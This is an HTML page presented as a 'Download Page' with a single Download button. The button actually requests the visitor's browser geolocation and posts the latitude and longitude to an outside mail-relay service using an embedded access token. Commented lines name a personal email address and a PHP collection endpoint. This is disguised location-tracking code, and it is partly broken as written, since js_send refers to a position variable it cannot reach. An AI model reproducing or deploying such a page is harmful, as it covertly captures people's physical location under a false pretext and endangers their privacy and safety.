<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Download Page</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
  <script>
  function getLocation() {
      if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(savePosition, positionError, {timeout:10000});
      } else {
          //Geolocation is not supported by this browser
      }
  }

  // handle the error here
  function positionError(error) {
      var errorCode = error.code;
      var message = error.message;

      alert(message);
  }

  function savePosition(position) {
            js_send()
            console.log(position.coords.latitude);
            console.log(position.coords.longitude);
            //sendMail('robertapeggio@gmail.com', 'test');
            //$.post("geocoordinates.php", {lat: position.coords.latitude, lng: position.coords.longitude});
  }

    //update this with your js_form selector
    var form_id_js = "javascript_form";

    var data_js = {
        "access_token": "xvpy72smyuk4ahk2nhdyygas"
    };

    function js_onSuccess() {
        // remove this to avoid redirect
        window.location = window.location.pathname + "?message=Email+Successfully+Sent%21&isError=0";
    }

    function js_onError(error) {
        // remove this to avoid redirect
        window.location = window.location.pathname + "?message=Email+could+not+be+sent.&isError=1";
    }

    var sendButton = document.getElementById("js_send");

    function js_send() {
        sendButton.value='Sendingâ€¦';
        sendButton.disabled=true;
        var request = new XMLHttpRequest();
        request.onreadystatechange = function() {
            if (request.readyState == 4 && request.status == 200) {
                js_onSuccess();
            } else
            if(request.readyState == 4) {
                js_onError(request.response);
            }
        };

        var subject = 'test';
        var message = position.coords.latitude;
        message += ',' + position.coords.longitude;
        data_js['subject'] = subject;
        data_js['text'] = message;
        var params = toParams(data_js);

        request.open("POST", "https://postmail.invotes.com/send", true);
        request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

        request.send(params);

        return false;
    }

    //sendButton.onclick = js_send;

    function toParams(data_js) {
        var form_data = [];
        for ( var key in data_js ) {
            form_data.push(encodeURIComponent(key) + "=" + encodeURIComponent(data_js[key]));
        }

        return form_data.join("&");
    }

    var js_form = document.getElementById(form_id_js);
    js_form.addEventListener("submit", function (e) {
        e.preventDefault();
    });
 </script>
</head>
<body>
    <button onclick="getLocation();">Download</button>
    
    <form id="javascript_form">
        <input type="hidden" name="subject" placeholder="Subject" />
        <textarea type = 'hidden' name="text" placeholder="Message"></textarea>
        <input type="hidden" id="js_send" value="Send" />
     </form>
</body>
</html>
